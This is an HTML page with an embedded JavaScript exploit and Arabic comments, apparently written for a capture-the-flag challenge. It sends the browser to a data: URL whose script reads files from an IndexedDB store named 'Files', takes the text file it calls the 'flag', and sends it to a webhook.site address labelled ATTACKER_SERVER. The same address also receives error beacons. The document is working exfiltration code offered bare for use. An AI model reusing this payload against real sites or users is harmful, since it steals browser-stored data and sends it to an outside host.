<!DOCTYPE html>
<html>
<body>
    <script>
        const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
        
        // كود الاستخراج المعتاد
        const scriptContent = `
            (async () => {
                const r = indexedDB.open('Files'); // No version needed
                r.onsuccess = () => {
                    const db = r.result;
                    // Check if object store exists
                    if (!db.objectStoreNames.contains('files')) {
                        fetch('${ATTACKER_SERVER}?error=no_store_in_data_uri');
                        return;
                    }
                    const tx = db.transaction('files', 'readonly');
                    const store = tx.objectStore('files');
                    const req = store.getAll();
                    req.onsuccess = e => {
                        const fileObj = e.target.result.find(o => o.file && o.file.type === 'text/plain');
                        if (fileObj) {
                            fileObj.file.text().then(flag => fetch('${ATTACKER_SERVER}?flag=' + encodeURIComponent(flag)));
                        } else {
                            fetch('${ATTACKER_SERVER}?error=flag_not_found');
                        }
                    };
                    req.onerror = () => fetch('${ATTACKER_SERVER}?error=getall_failed');
                };
                r.onerror = () => fetch('${ATTACKER_SERVER}?error=dbopen_failed');
            })();
        `;
        
        // إنشاء رابط بيانات يحتوي على صفحة كاملة تنفذ الكود
        const dataUrl = 'data:text/html,<script>' + encodeURIComponent(scriptContent) + '<\/script>';
        
        // التنقل إليه
        window.location = dataUrl;
    </script>
</body>
</html>
